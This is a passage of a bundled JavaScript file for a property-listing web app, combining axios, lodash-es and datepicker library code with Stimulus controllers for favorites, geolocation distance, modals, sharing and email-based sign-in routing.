      return callback.apply(null, arr);
    };
  }

  // node_modules/axios/lib/helpers/isAxiosError.js
  function isAxiosError(payload) {
    return utils_default.isObject(payload) && payload.isAxiosError === true;
  }

  // node_modules/axios/lib/helpers/HttpStatusCode.js
  var HttpStatusCode = {
    Continue: 100,
    SwitchingProtocols: 101,
    Processing: 102,
    EarlyHints: 103,
    Ok: 200,
    Created: 201,
    Accepted: 202,
    NonAuthoritativeInformation: 203,
    NoContent: 204,
    ResetContent: 205,
    PartialContent: 206,
    MultiStatus: 207,
    AlreadyReported: 208,
    ImUsed: 226,
    MultipleChoices: 300,
    MovedPermanently: 301,
    Found: 302,
    SeeOther: 303,
    NotModified: 304,
    UseProxy: 305,
    Unused: 306,
    TemporaryRedirect: 307,
    PermanentRedirect: 308,
    BadRequest: 400,
    Unauthorized: 401,
    PaymentRequired: 402,
    Forbidden: 403,
    NotFound: 404,
    MethodNotAllowed: 405,
    NotAcceptable: 406,
    ProxyAuthenticationRequired: 407,
    RequestTimeout: 408,
    Conflict: 409,
    Gone: 410,
    LengthRequired: 411,
    PreconditionFailed: 412,
    PayloadTooLarge: 413,
    UriTooLong: 414,
    UnsupportedMediaType: 415,
    RangeNotSatisfiable: 416,
    ExpectationFailed: 417,
    ImATeapot: 418,
    MisdirectedRequest: 421,
    UnprocessableEntity: 422,
    Locked: 423,
    FailedDependency: 424,
    TooEarly: 425,
    UpgradeRequired: 426,
    PreconditionRequired: 428,
    TooManyRequests: 429,
    RequestHeaderFieldsTooLarge: 431,
    UnavailableForLegalReasons: 451,
    InternalServerError: 500,
    NotImplemented: 501,
    BadGateway: 502,
    ServiceUnavailable: 503,
    GatewayTimeout: 504,
    HttpVersionNotSupported: 505,
    VariantAlsoNegotiates: 506,
    InsufficientStorage: 507,
    LoopDetected: 508,
    NotExtended: 510,
    NetworkAuthenticationRequired: 511
  };
  Object.entries(HttpStatusCode).forEach(([key, value]) => {
    HttpStatusCode[value] = key;
  });
  var HttpStatusCode_default = HttpStatusCode;

  // node_modules/axios/lib/axios.js
  function createInstance(defaultConfig) {
    const context = new Axios_default(defaultConfig);
    const instance = bind(Axios_default.prototype.request, context);
    utils_default.extend(instance, Axios_default.prototype, context, { allOwnKeys: true });
    utils_default.extend(instance, context, null, { allOwnKeys: true });
    instance.create = function create(instanceConfig) {
      return createInstance(mergeConfig(defaultConfig, instanceConfig));
    };
    return instance;
  }
  var axios = createInstance(defaults_default);
  axios.Axios = Axios_default;
  axios.CanceledError = CanceledError_default;
  axios.CancelToken = CancelToken_default;
  axios.isCancel = isCancel;
  axios.VERSION = VERSION;
  axios.toFormData = toFormData_default;
  axios.AxiosError = AxiosError_default;
  axios.Cancel = axios.CanceledError;
  axios.all = function all(promises) {
    return Promise.all(promises);
  };
  axios.spread = spread;
  axios.isAxiosError = isAxiosError;
  axios.mergeConfig = mergeConfig;
  axios.AxiosHeaders = AxiosHeaders_default;
  axios.formToJSON = (thing) => formDataToJSON_default(utils_default.isHTMLForm(thing) ? new FormData(thing) : thing);
  axios.getAdapter = adapters_default2.getAdapter;
  axios.HttpStatusCode = HttpStatusCode_default;
  axios.default = axios;
  var axios_default = axios;

  // node_modules/axios/index.js
  var {
    Axios: Axios2,
    AxiosError: AxiosError2,
    CanceledError: CanceledError2,
    isCancel: isCancel2,
    CancelToken: CancelToken2,
    VERSION: VERSION2,
    all: all2,
    Cancel,
    isAxiosError: isAxiosError2,
    spread: spread2,
    toFormData: toFormData2,
    AxiosHeaders: AxiosHeaders2,
    HttpStatusCode: HttpStatusCode2,
    formToJSON,
    getAdapter,
    mergeConfig: mergeConfig2
  } = axios_default;

  // app/javascript/controllers/favorites_controller.js
  var favorites_controller_default = class extends Controller {
    HEADERS = { "ACCEPT": "application/json" };
    favorite(e) {
      e.preventDefault();
      if (this.element.dataset.userLoggedIn === "false") {
        return document.querySelector('[data-header-target="userAuthLink"]').click();
      }
      if (this.element.dataset.favorited === "true") {
        this.doUnfavorite();
      } else {
        this.doFavorite();
      }
    }
    getFavoritePath() {
      return "/api/favorites";
    }
    getUnfavoritePath(favoriteId) {
      return `/api/favorites/${favoriteId}`;
    }
    doFavorite() {
      axios_default({
        method: "post",
        url: this.getFavoritePath(),
        data: {
          property_id: this.element.dataset.propertyId
        },
        headers: this.HEADERS
      }).then((response) => {
        this.element.dataset.favoriteId = response.data.id;
        this.element.setAttribute("fill", "red");
        this.element.dataset.favorited = "true";
      });
    }
    doUnfavorite() {
      axios_default({
        method: "delete",
        url: this.getUnfavoritePath(this.element.dataset.favoriteId),
        headers: this.HEADERS
      }).then((response) => {
        this.element.dataset.favoriteId = "";
        this.element.setAttribute("fill", this.element.dataset.defaultFill);
        this.element.dataset.favorited = "false";
      });
    }
  };

  // app/javascript/controllers/geolocation_controller.js
  var import_geolib = __toESM(require_es());

  // node_modules/lodash-es/_freeGlobal.js
  var freeGlobal = typeof global == "object" && global && global.Object === Object && global;
  var freeGlobal_default = freeGlobal;

  // node_modules/lodash-es/_root.js
  var freeSelf = typeof self == "object" && self && self.Object === Object && self;
  var root = freeGlobal_default || freeSelf || Function("return this")();
  var root_default = root;

  // node_modules/lodash-es/_Symbol.js
  var Symbol2 = root_default.Symbol;
  var Symbol_default = Symbol2;

  // node_modules/lodash-es/_getRawTag.js
  var objectProto = Object.prototype;
  var hasOwnProperty2 = objectProto.hasOwnProperty;
  var nativeObjectToString = objectProto.toString;
  var symToStringTag = Symbol_default ? Symbol_default.toStringTag : void 0;
  function getRawTag(value) {
    var isOwn = hasOwnProperty2.call(value, symToStringTag), tag = value[symToStringTag];
    try {
      value[symToStringTag] = void 0;
      var unmasked = true;
    } catch (e) {
    }
    var result = nativeObjectToString.call(value);
    if (unmasked) {
      if (isOwn) {
        value[symToStringTag] = tag;
      } else {
        delete value[symToStringTag];
      }
    }
    return result;
  }
  var getRawTag_default = getRawTag;

  // node_modules/lodash-es/_objectToString.js
  var objectProto2 = Object.prototype;
  var nativeObjectToString2 = objectProto2.toString;
  function objectToString(value) {
    return nativeObjectToString2.call(value);
  }
  var objectToString_default = objectToString;

  // node_modules/lodash-es/_baseGetTag.js
  var nullTag = "[object Null]";
  var undefinedTag = "[object Undefined]";
  var symToStringTag2 = Symbol_default ? Symbol_default.toStringTag : void 0;
  function baseGetTag(value) {
    if (value == null) {
      return value === void 0 ? undefinedTag : nullTag;
    }
    return symToStringTag2 && symToStringTag2 in Object(value) ? getRawTag_default(value) : objectToString_default(value);
  }
  var baseGetTag_default = baseGetTag;

  // node_modules/lodash-es/isObjectLike.js
  function isObjectLike(value) {
    return value != null && typeof value == "object";
  }
  var isObjectLike_default = isObjectLike;

  // node_modules/lodash-es/isArray.js
  var isArray2 = Array.isArray;
  var isArray_default = isArray2;

  // node_modules/lodash-es/isObject.js
  function isObject2(value) {
    var type = typeof value;
    return value != null && (type == "object" || type == "function");
  }
  var isObject_default = isObject2;

  // node_modules/lodash-es/isFunction.js
  var asyncTag = "[object AsyncFunction]";
  var funcTag = "[object Function]";
  var genTag = "[object GeneratorFunction]";
  var proxyTag = "[object Proxy]";
  function isFunction2(value) {
    if (!isObject_default(value)) {
      return false;
    }
    var tag = baseGetTag_default(value);
    return tag == funcTag || tag == genTag || tag == asyncTag || tag == proxyTag;
  }
  var isFunction_default = isFunction2;

  // node_modules/lodash-es/_coreJsData.js
  var coreJsData = root_default["__core-js_shared__"];
  var coreJsData_default = coreJsData;

  // node_modules/lodash-es/_isMasked.js
  var maskSrcKey = function() {
    var uid = /[^.]+$/.exec(coreJsData_default && coreJsData_default.keys && coreJsData_default.keys.IE_PROTO || "");
    return uid ? "Symbol(src)_1." + uid : "";
  }();
  function isMasked(func) {
    return !!maskSrcKey && maskSrcKey in func;
  }
  var isMasked_default = isMasked;

  // node_modules/lodash-es/_toSource.js
  var funcProto = Function.prototype;
  var funcToString = funcProto.toString;
  function toSource(func) {
    if (func != null) {
      try {
        return funcToString.call(func);
      } catch (e) {
      }
      try {
        return func + "";
      } catch (e) {
      }
    }
    return "";
  }
  var toSource_default = toSource;

  // node_modules/lodash-es/_baseIsNative.js
  var reRegExpChar = /[\\^$.*+?()[\]{}|]/g;
  var reIsHostCtor = /^\[object .+?Constructor\]$/;
  var funcProto2 = Function.prototype;
  var objectProto3 = Object.prototype;
  var funcToString2 = funcProto2.toString;
  var hasOwnProperty3 = objectProto3.hasOwnProperty;
  var reIsNative = RegExp(
    "^" + funcToString2.call(hasOwnProperty3).replace(reRegExpChar, "\\$&").replace(/hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g, "$1.*?") + "$"
  );
  function baseIsNative(value) {
    if (!isObject_default(value) || isMasked_default(value)) {
      return false;
    }
    var pattern = isFunction_default(value) ? reIsNative : reIsHostCtor;
    return pattern.test(toSource_default(value));
  }
  var baseIsNative_default = baseIsNative;

  // node_modules/lodash-es/_getValue.js
  function getValue(object, key) {
    return object == null ? void 0 : object[key];
  }
  var getValue_default = getValue;

  // node_modules/lodash-es/_getNative.js
  function getNative(object, key) {
    var value = getValue_default(object, key);
    return baseIsNative_default(value) ? value : void 0;
  }
  var getNative_default = getNative;

  // node_modules/lodash-es/_WeakMap.js
  var WeakMap2 = getNative_default(root_default, "WeakMap");
  var WeakMap_default = WeakMap2;

  // node_modules/lodash-es/isLength.js
  var MAX_SAFE_INTEGER = 9007199254740991;
  function isLength(value) {
    return typeof value == "number" && value > -1 && value % 1 == 0 && value <= MAX_SAFE_INTEGER;
  }
  var isLength_default = isLength;

  // node_modules/lodash-es/isArrayLike.js
  function isArrayLike(value) {
    return value != null && isLength_default(value.length) && !isFunction_default(value);
  }
  var isArrayLike_default = isArrayLike;

  // node_modules/lodash-es/_isPrototype.js
  var objectProto4 = Object.prototype;
  function isPrototype(value) {
    var Ctor = value && value.constructor, proto = typeof Ctor == "function" && Ctor.prototype || objectProto4;
    return value === proto;
  }
  var isPrototype_default = isPrototype;

  // node_modules/lodash-es/_baseIsArguments.js
  var argsTag = "[object Arguments]";
  function baseIsArguments(value) {
    return isObjectLike_default(value) && baseGetTag_default(value) == argsTag;
  }
  var baseIsArguments_default = baseIsArguments;

  // node_modules/lodash-es/isArguments.js
  var objectProto5 = Object.prototype;
  var hasOwnProperty4 = objectProto5.hasOwnProperty;
  var propertyIsEnumerable = objectProto5.propertyIsEnumerable;
  var isArguments = baseIsArguments_default(/* @__PURE__ */ function() {
    return arguments;
  }()) ? baseIsArguments_default : function(value) {
    return isObjectLike_default(value) && hasOwnProperty4.call(value, "callee") && !propertyIsEnumerable.call(value, "callee");
  };
  var isArguments_default = isArguments;

  // node_modules/lodash-es/stubFalse.js
  function stubFalse() {
    return false;
  }
  var stubFalse_default = stubFalse;

  // node_modules/lodash-es/isBuffer.js
  var freeExports = typeof exports == "object" && exports && !exports.nodeType && exports;
  var freeModule = freeExports && typeof module == "object" && module && !module.nodeType && module;
  var moduleExports = freeModule && freeModule.exports === freeExports;
  var Buffer2 = moduleExports ? root_default.Buffer : void 0;
  var nativeIsBuffer = Buffer2 ? Buffer2.isBuffer : void 0;
  var isBuffer2 = nativeIsBuffer || stubFalse_default;
  var isBuffer_default = isBuffer2;

  // node_modules/lodash-es/_baseIsTypedArray.js
  var argsTag2 = "[object Arguments]";
  var arrayTag = "[object Array]";
  var boolTag = "[object Boolean]";
  var dateTag = "[object Date]";
  var errorTag = "[object Error]";
  var funcTag2 = "[object Function]";
  var mapTag = "[object Map]";
  var numberTag = "[object Number]";
  var objectTag = "[object Object]";
  var regexpTag = "[object RegExp]";
  var setTag = "[object Set]";
  var stringTag = "[object String]";
  var weakMapTag = "[object WeakMap]";
  var arrayBufferTag = "[object ArrayBuffer]";
  var dataViewTag = "[object DataView]";
  var float32Tag = "[object Float32Array]";
  var float64Tag = "[object Float64Array]";
  var int8Tag = "[object Int8Array]";
  var int16Tag = "[object Int16Array]";
  var int32Tag = "[object Int32Array]";
  var uint8Tag = "[object Uint8Array]";
  var uint8ClampedTag = "[object Uint8ClampedArray]";
  var uint16Tag = "[object Uint16Array]";
  var uint32Tag = "[object Uint32Array]";
  var typedArrayTags = {};
  typedArrayTags[float32Tag] = typedArrayTags[float64Tag] = typedArrayTags[int8Tag] = typedArrayTags[int16Tag] = typedArrayTags[int32Tag] = typedArrayTags[uint8Tag] = typedArrayTags[uint8ClampedTag] = typedArrayTags[uint16Tag] = typedArrayTags[uint32Tag] = true;
  typedArrayTags[argsTag2] = typedArrayTags[arrayTag] = typedArrayTags[arrayBufferTag] = typedArrayTags[boolTag] = typedArrayTags[dataViewTag] = typedArrayTags[dateTag] = typedArrayTags[errorTag] = typedArrayTags[funcTag2] = typedArrayTags[mapTag] = typedArrayTags[numberTag] = typedArrayTags[objectTag] = typedArrayTags[regexpTag] = typedArrayTags[setTag] = typedArrayTags[stringTag] = typedArrayTags[weakMapTag] = false;
  function baseIsTypedArray(value) {
    return isObjectLike_default(value) && isLength_default(value.length) && !!typedArrayTags[baseGetTag_default(value)];
  }
  var baseIsTypedArray_default = baseIsTypedArray;

  // node_modules/lodash-es/_baseUnary.js
  function baseUnary(func) {
    return function(value) {
      return func(value);
    };
  }
  var baseUnary_default = baseUnary;

  // node_modules/lodash-es/_nodeUtil.js
  var freeExports2 = typeof exports == "object" && exports && !exports.nodeType && exports;
  var freeModule2 = freeExports2 && typeof module == "object" && module && !module.nodeType && module;
  var moduleExports2 = freeModule2 && freeModule2.exports === freeExports2;
  var freeProcess = moduleExports2 && freeGlobal_default.process;
  var nodeUtil = function() {
    try {
      var types = freeModule2 && freeModule2.require && freeModule2.require("util").types;
      if (types) {
        return types;
      }
      return freeProcess && freeProcess.binding && freeProcess.binding("util");
    } catch (e) {
    }
  }();
  var nodeUtil_default = nodeUtil;

  // node_modules/lodash-es/isTypedArray.js
  var nodeIsTypedArray = nodeUtil_default && nodeUtil_default.isTypedArray;
  var isTypedArray2 = nodeIsTypedArray ? baseUnary_default(nodeIsTypedArray) : baseIsTypedArray_default;
  var isTypedArray_default = isTypedArray2;

  // node_modules/lodash-es/_overArg.js
  function overArg(func, transform) {
    return function(arg) {
      return func(transform(arg));
    };
  }
  var overArg_default = overArg;

  // node_modules/lodash-es/_nativeKeys.js
  var nativeKeys = overArg_default(Object.keys, Object);
  var nativeKeys_default = nativeKeys;

  // node_modules/lodash-es/_baseKeys.js
  var objectProto6 = Object.prototype;
  var hasOwnProperty5 = objectProto6.hasOwnProperty;
  function baseKeys(object) {
    if (!isPrototype_default(object)) {
      return nativeKeys_default(object);
    }
    var result = [];
    for (var key in Object(object)) {
      if (hasOwnProperty5.call(object, key) && key != "constructor") {
        result.push(key);
      }
    }
    return result;
  }
  var baseKeys_default = baseKeys;

  // node_modules/lodash-es/_Map.js
  var Map2 = getNative_default(root_default, "Map");
  var Map_default = Map2;

  // node_modules/lodash-es/_DataView.js
  var DataView = getNative_default(root_default, "DataView");
  var DataView_default = DataView;

  // node_modules/lodash-es/_Promise.js
  var Promise2 = getNative_default(root_default, "Promise");
  var Promise_default = Promise2;

  // node_modules/lodash-es/_Set.js
  var Set2 = getNative_default(root_default, "Set");
  var Set_default = Set2;

  // node_modules/lodash-es/_getTag.js
  var mapTag2 = "[object Map]";
  var objectTag2 = "[object Object]";
  var promiseTag = "[object Promise]";
  var setTag2 = "[object Set]";
  var weakMapTag2 = "[object WeakMap]";
  var dataViewTag2 = "[object DataView]";
  var dataViewCtorString = toSource_default(DataView_default);
  var mapCtorString = toSource_default(Map_default);
  var promiseCtorString = toSource_default(Promise_default);
  var setCtorString = toSource_default(Set_default);
  var weakMapCtorString = toSource_default(WeakMap_default);
  var getTag = baseGetTag_default;
  if (DataView_default && getTag(new DataView_default(new ArrayBuffer(1))) != dataViewTag2 || Map_default && getTag(new Map_default()) != mapTag2 || Promise_default && getTag(Promise_default.resolve()) != promiseTag || Set_default && getTag(new Set_default()) != setTag2 || WeakMap_default && getTag(new WeakMap_default()) != weakMapTag2) {
    getTag = function(value) {
      var result = baseGetTag_default(value), Ctor = result == objectTag2 ? value.constructor : void 0, ctorString = Ctor ? toSource_default(Ctor) : "";
      if (ctorString) {
        switch (ctorString) {
          case dataViewCtorString:
            return dataViewTag2;
          case mapCtorString:
            return mapTag2;
          case promiseCtorString:
            return promiseTag;
          case setCtorString:
            return setTag2;
          case weakMapCtorString:
            return weakMapTag2;
        }
      }
      return result;
    };
  }
  var getTag_default = getTag;

  // node_modules/lodash-es/isEmpty.js
  var mapTag3 = "[object Map]";
  var setTag3 = "[object Set]";
  var objectProto7 = Object.prototype;
  var hasOwnProperty6 = objectProto7.hasOwnProperty;
  function isEmpty(value) {
    if (value == null) {
      return true;
    }
    if (isArrayLike_default(value) && (isArray_default(value) || typeof value == "string" || typeof value.splice == "function" || isBuffer_default(value) || isTypedArray_default(value) || isArguments_default(value))) {
      return !value.length;
    }
    var tag = getTag_default(value);
    if (tag == mapTag3 || tag == setTag3) {
      return !value.size;
    }
    if (isPrototype_default(value)) {
      return !baseKeys_default(value).length;
    }
    for (var key in value) {
      if (hasOwnProperty6.call(value, key)) {
        return false;
      }
    }
    return true;
  }
  var isEmpty_default = isEmpty;

  // app/javascript/controllers/geolocation_controller.js
  var geolocation_controller_default = class extends Controller {
    static targets = ["property"];
    connect() {
      if (isEmpty_default(this.element.dataset.latitude) && isEmpty_default(this.element.dataset.longitude)) {
        window.navigator.geolocation.getCurrentPosition((position) => {
          this.setUserCoordinates({ latitude: position.coords.latitude, longitude: position.coords.longitude });
        });
      }
      this.setDistanceText();
    }
    getUserCoordinates() {
      return {
        latitude: this.element.dataset.latitude,
        longitude: this.element.dataset.longitude
      };
    }
    setUserCoordinates(coordinates) {
      this.element.dataset.latitude = coordinates.latitude;
      this.element.dataset.longitude = coordinates.longitude;
    }
    setDistanceText() {
      this.propertyTargets.forEach((propertyTarget) => {
        let distanceFrom = (0, import_geolib.getDistance)(
          this.getUserCoordinates(),
          { latitude: propertyTarget.dataset.propertyLatitude, longitude: propertyTarget.dataset.propertyLongitude }
        );
        propertyTarget.querySelector("#distance-away").textContent = `${Math.round((0, import_geolib.convertDistance)(distanceFrom, "km"))} kilometers away`;
      });
    }
  };

  // node_modules/el-transition/index.js
  async function enter(element, transitionName = null) {
    element.classList.remove("hidden");
    await transition("enter", element, transitionName);
  }
  async function leave(element, transitionName = null) {
    await transition("leave", element, transitionName);
    element.classList.add("hidden");
  }
  async function toggle(element, transitionName = null) {
    if (element.classList.contains("hidden")) {
      await enter(element, transitionName);
    } else {
      await leave(element, transitionName);
    }
  }
  async function transition(direction, element, animation) {
    const dataset = element.dataset;
    const animationClass = animation ? `${animation}-${direction}` : direction;
    let transition2 = `transition${direction.charAt(0).toUpperCase() + direction.slice(1)}`;
    const genesis = dataset[transition2] ? dataset[transition2].split(" ") : [animationClass];
    const start2 = dataset[`${transition2}Start`] ? dataset[`${transition2}Start`].split(" ") : [`${animationClass}-start`];
    const end = dataset[`${transition2}End`] ? dataset[`${transition2}End`].split(" ") : [`${animationClass}-end`];
    addClasses(element, genesis);
    addClasses(element, start2);
    await nextFrame();
    removeClasses(element, start2);
    addClasses(element, end);
    await afterTransition(element);
    removeClasses(element, end);
    removeClasses(element, genesis);
  }
  function addClasses(element, classes) {
    element.classList.add(...classes);
  }
  function removeClasses(element, classes) {
    element.classList.remove(...classes);
  }
  function nextFrame() {
    return new Promise((resolve) => {
      requestAnimationFrame(() => {
        requestAnimationFrame(resolve);
      });
    });
  }
  function afterTransition(element) {
    return new Promise((resolve) => {
      const computedDuration = getComputedStyle(element).transitionDuration.split(",")[0];
      const duration = Number(computedDuration.replace("s", "")) * 1e3;
      setTimeout(() => {
        resolve();
      }, duration);
    });
  }

  // app/javascript/controllers/header_controller.js
  var header_controller_default = class extends Controller {
    static targets = ["openUserMenu", "userAuthLink"];
    connect() {
      this.openUserMenuTarget.addEventListener("click", this.toggleDropdownMenu);
      this.userAuthLinkTargets.forEach((link) => {
        link.addEventListener("click", (e) => {
          e.preventDefault();
          document.querySelector("#user-auth-modal-trigger").click();
        });
      });
    }
    toggleDropdownMenu() {
      toggle(document.querySelector("#menu-dropdown-items"));
    }
  };

  // app/javascript/controllers/modal_controller.js
  var modal_controller_default = class extends Controller {
    static targets = ["closeButton"];
    static values = { triggerId: String };
    connect() {
      this.element.addEventListener("click", (event) => this.closeModal(event));
      this.closeButtonTarget.addEventListener("click", () => {
        leave(this.element);
        leave(this.element.querySelector("#modal-backdrop"));
        leave(this.element.querySelector("#modal-panel"));
      });
    }
    showModal() {
      enter(this.element);
      enter(this.element.querySelector("#modal-backdrop"));
      enter(this.element.querySelector("#modal-panel"));
    }
    closeModal(event) {
      const modalPanelClicked = this.element.querySelector("#modal-panel").contains(event.target);
      if (!modalPanelClicked && event.target.id !== this.triggerIdValue) {
        leave(this.element);
        leave(this.element.querySelector("#modal-backdrop"));
        leave(this.element.querySelector("#modal-panel"));
      }
    }
  };

  // app/javascript/controllers/share_controller.js
  var share_controller_default = class extends Controller {
    share(e) {
      document.querySelector("#share-modal-trigger").click();
    }
  };

  // app/javascript/controllers/users_by_email_auth_controller.js
  var users_by_email_auth_controller_default = class extends Controller {
    static targets = ["email", "submit", "emailWrapper", "invalidSvg", "errorMessage"];
    connect() {
      this.submitTarget.addEventListener("click", (e) => {
        e.preventDefault();
        if (this.emailTarget.value.length === 0) {
          this.emailWrapperTarget.classList.remove("focus-within:ring-1");
          this.emailWrapperTarget.classList.remove("focus-within:ring-black");
          this.emailWrapperTarget.classList.remove("focus-within:border-black");
          this.emailWrapperTarget.classList.add("invalid-inset-input-text-field");
          this.invalidSvgTarget.classList.remove("hidden");
          this.errorMessageTarget.classList.remove("hidden");
        } else {
          axios_default.get("/api/users_by_email", {
            params: { email: this.emailTarget.value },
            headers: {
              "ACCEPT": "application/json"
            }
          }).then((response) => {
            Turbo.visit("/users/sign_in");
          }).catch((response) => {
            Turbo.visit("/users/sign_up");
          });
        }
      });
    }
  };

  // app/javascript/controllers/share_modal_controller.js
  var share_modal_controller_default = class extends Controller {
    copy() {
      navigator.clipboard.writeText(this.element.dataset.shareUrl);
    }
    shareWhatsapp() {
      window.open("https://web.whatsapp.com", "_blank", "noopener, noreferrer");
    }
    shareTwitter() {
      window.open("https://twitter.com", "_blank", "noopener, noreferrer");
    }
    shareFacebook() {
      window.open("https://www.facebook.com/", "_blank", "noopener, noreferrer");
    }
  };

  // app/javascript/controllers/property_controller.js
  var property_controller_default = class extends Controller {
    readDescription() {
      document.querySelector("#property-description-modal-trigger").click();
    }
  };

  // node_modules/vanillajs-datepicker/js/lib/utils.js
  function lastItemOf(arr) {
    return arr[arr.length - 1];
  }
  function pushUnique(arr, ...items) {
    items.forEach((item) => {
      if (arr.includes(item)) {
        return;
      }
      arr.push(item);
    });
    return arr;
  }
  function stringToArray(str, separator) {
    return str ? str.split(separator) : [];
  }
  function isInRange(testVal, min, max) {
    const minOK = min === void 0 || testVal >= min;
    const maxOK = max === void 0 || testVal <= max;
    return minOK && maxOK;
  }
  function limitToRange(val, min, max) {
    if (val < min) {
      return min;
    }
    if (val > max) {
      return max;
    }
    return val;
  }
  function createTagRepeat(tagName, repeat, attributes = {}, index = 0, html = "") {
    const openTagSrc = Object.keys(attributes).reduce((src, attr) => {
      let val = attributes[attr];
      if (typeof val === "function") {
        val = val(index);
      }
      return `${src} ${attr}="${val}"`;
    }, tagName);
    html += `<${openTagSrc}></${tagName}>`;
    const next = index + 1;
    return next < repeat ? createTagRepeat(tagName, repeat, attributes, next, html) : html;
  }
  function optimizeTemplateHTML(html) {
    return html.replace(/>\s+/g, ">").replace(/\s+</, "<");
  }

  // node_modules/vanillajs-datepicker/js/lib/date.js
  function stripTime(timeValue) {
    return new Date(timeValue).setHours(0, 0, 0, 0);
  }
  function today() {
    return (/* @__PURE__ */ new Date()).setHours(0, 0, 0, 0);
  }
  function dateValue(...args) {
    switch (args.length) {
      case 0:
        return today();
      case 1:
        return stripTime(args[0]);
    }
    const newDate = /* @__PURE__ */ new Date(0);
    newDate.setFullYear(...args);
    return newDate.setHours(0, 0, 0, 0);
  }
  function addDays(date, amount) {
    const newDate = new Date(date);
    return newDate.setDate(newDate.getDate() + amount);
  }
  function addWeeks(date, amount) {
    return addDays(date, amount * 7);
  }
  function addMonths(date, amount) {
    const newDate = new Date(date);
    const monthsToSet = newDate.getMonth() + amount;
    let expectedMonth = monthsToSet % 12;
    if (expectedMonth < 0) {
      expectedMonth += 12;
    }
    const time = newDate.setMonth(monthsToSet);
    return newDate.getMonth() !== expectedMonth ? newDate.setDate(0) : time;
  }
  function addYears(date, amount) {
    const newDate = new Date(date);
    const expectedMonth = newDate.getMonth();
    const time = newDate.setFullYear(newDate.getFullYear() + amount);
    return expectedMonth === 1 && newDate.getMonth() === 2 ? newDate.setDate(0) : time;
  }
  function dayDiff(day, from) {
    return (day - from + 7) % 7;
  }
  function dayOfTheWeekOf(baseDate, dayOfWeek, weekStart = 0) {
    const baseDay = new Date(baseDate).getDay();
    return addDays(baseDate, dayDiff(dayOfWeek, weekStart) - dayDiff(baseDay, weekStart));
  }
  function calcWeekNum(dayOfTheWeek, sameDayOfFirstWeek) {
    return Math.round((dayOfTheWeek - sameDayOfFirstWeek) / 6048e5) + 1;
  }
  function getIsoWeek(date) {
    const thuOfTheWeek = dayOfTheWeekOf(date, 4, 1);
    const firstThu = dayOfTheWeekOf(new Date(thuOfTheWeek).setMonth(0, 4), 4, 1);
    return calcWeekNum(thuOfTheWeek, firstThu);
  }
  function calcTraditionalWeekNumber(date, weekStart) {
    const startOfFirstWeek = dayOfTheWeekOf(new Date(date).setMonth(0, 1), weekStart, weekStart);
    const startOfTheWeek = dayOfTheWeekOf(date, weekStart, weekStart);
    const weekNum = calcWeekNum(startOfTheWeek, startOfFirstWeek);
    if (weekNum < 53) {
      return weekNum;
    }
    const weekOneOfNextYear = dayOfTheWeekOf(new Date(date).setDate(32), weekStart, weekStart);
    return startOfTheWeek === weekOneOfNextYear ? 1 : weekNum;
  }
  function getWesternTradWeek(date) {
    return calcTraditionalWeekNumber(date, 0);
  }
  function getMidEasternWeek(date) {
    return calcTraditionalWeekNumber(date, 6);
  }
  function startOfYearPeriod(date, years) {
    const year = new Date(date).getFullYear();
    return Math.floor(year / years) * years;
  }
  function regularizeDate(date, timeSpan, useLastDate) {
    if (timeSpan !== 1 && timeSpan !== 2) {
      return date;
    }
    const newDate = new Date(date);
    if (timeSpan === 1) {
      useLastDate ? newDate.setMonth(newDate.getMonth() + 1, 0) : newDate.setDate(1);
    } else {
      useLastDate ? newDate.setFullYear(newDate.getFullYear() + 1, 0, 0) : newDate.setMonth(0, 1);
    }
    return newDate.setHours(0, 0, 0, 0);
  }

  // node_modules/vanillajs-datepicker/js/lib/date-format.js
  var reFormatTokens = /dd?|DD?|mm?|MM?|yy?(?:yy)?/;
  var reNonDateParts = /[\s!-/:-@[-`{-~年月日]+/;
  var knownFormats = {};
  var parseFns = {
    y(date, year) {
      return new Date(date).setFullYear(parseInt(year, 10));
    },
    m(date, month, locale) {
      const newDate = new Date(date);
      let monthIndex = parseInt(month, 10) - 1;
      if (isNaN(monthIndex)) {
        if (!month) {
          return NaN;
        }
        const monthName = month.toLowerCase();
        const compareNames = (name) => name.toLowerCase().startsWith(monthName);
        monthIndex = locale.monthsShort.findIndex(compareNames);
        if (monthIndex < 0) {
          monthIndex = locale.months.findIndex(compareNames);
        }
        if (monthIndex < 0) {
          return NaN;
        }
      }
      newDate.setMonth(monthIndex);
      return newDate.getMonth() !== normalizeMonth(monthIndex) ? newDate.setDate(0) : newDate.getTime();
    },
    d(date, day) {
      return new Date(date).setDate(parseInt(day, 10));
    }
  };
  var formatFns = {
    d(date) {
      return date.getDate();
    },
    dd(date) {
      return padZero(date.getDate(), 2);
    },
    D(date, locale) {
      return locale.daysShort[date.getDay()];
    },
    DD(date, locale) {
      return locale.days[date.getDay()];
    },
    m(date) {
      return date.getMonth() + 1;
    },
    mm(date) {
      return padZero(date.getMonth() + 1, 2);
    },
    M(date, locale) {
      return locale.monthsShort[date.getMonth()];
    },
    MM(date, locale) {
      return locale.months[date.getMonth()];
    },
    y(date) {
      return date.getFullYear();
    },
    yy(date) {
      return padZero(date.getFullYear(), 2).slice(-2);
    },
    yyyy(date) {
      return padZero(date.getFullYear(), 4);
    }
  };
  function normalizeMonth(monthIndex) {
    return monthIndex > -1 ? monthIndex % 12 : normalizeMonth(monthIndex + 12);
  }
  function padZero(num, length) {
    return num.toString().padStart(length, "0");
  }
  function parseFormatString(format) {
    if (typeof format !== "string") {
      throw new Error("Invalid date format.");
    }
    if (format in knownFormats) {
      return knownFormats[format];
    }
    const separators = format.split(reFormatTokens);
    const parts = format.match(new RegExp(reFormatTokens, "g"));
    if (separators.length === 0 || !parts) {
      throw new Error("Invalid date format.");
    }
    const partFormatters = parts.map((token) => formatFns[token]);
    const partParserKeys = Object.keys(parseFns).reduce((keys, key) => {
      const token = parts.find((part) => part[0] !== "D" && part[0].toLowerCase() === key);
      if (token) {
        keys.push(key);
      }
      return keys;
    }, []);
    return knownFormats[format] = {
      parser(dateStr, locale) {
        const dateParts = dateStr.split(reNonDateParts).reduce((dtParts, part, index) => {
          if (part.length > 0 && parts[index]) {
            const token = parts[index][0];
            if (token === "M") {
              dtParts.m = part;
            } else if (token !== "D") {
              dtParts[token] = part;
            }
          }
          return dtParts;
        }, {});
        return partParserKeys.reduce((origDate, key) => {
          const newDate = parseFns[key](origDate, dateParts[key], locale);
          return isNaN(newDate) ? origDate : newDate;
        }, today());
      },
      formatter(date, locale) {
        let dateStr = partFormatters.reduce((str, fn, index) => {
          return str += `${separators[index]}${fn(date, locale)}`;
        }, "");
        return dateStr += lastItemOf(separators);
      }
    };
  }
